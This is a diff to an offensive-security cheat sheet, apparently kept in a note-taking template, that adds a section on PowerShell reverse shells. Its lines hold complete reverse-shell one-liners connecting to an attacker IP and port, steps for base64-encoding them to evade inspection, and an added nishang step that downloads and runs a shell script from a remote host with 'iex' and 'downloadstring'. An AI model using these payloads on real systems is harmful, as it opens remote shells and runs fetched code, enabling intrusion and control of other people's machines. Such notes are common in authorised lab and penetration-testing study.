@@ -181,8 +181,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.fro
 
 powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
-
-#Powershell: Create powershell reverse shell on kali linux
+#############################################################################################
+# Powershell: Create powershell reverse shell on kali linux
 $ kali@kali:~$ pwsh
 
 PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
@@ -192,6 +192,14 @@ PS> $EncodedText =[Convert]::ToBase64String($Bytes)
 PS> $EncodedText
 
 $powershell -enc $EncodedText
+
+#############################################################################################
+# powershell with nishang
+## download and move shell's location && change file name
+cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+mv Invoke-PowerShellTcp.ps1 shell.ps1
+powershell -c iex(new-object net.webclient).downloadstring(‘http://10.10.14.7:5555/shell.ps1')
+
 ```
 
 ## Web Shell
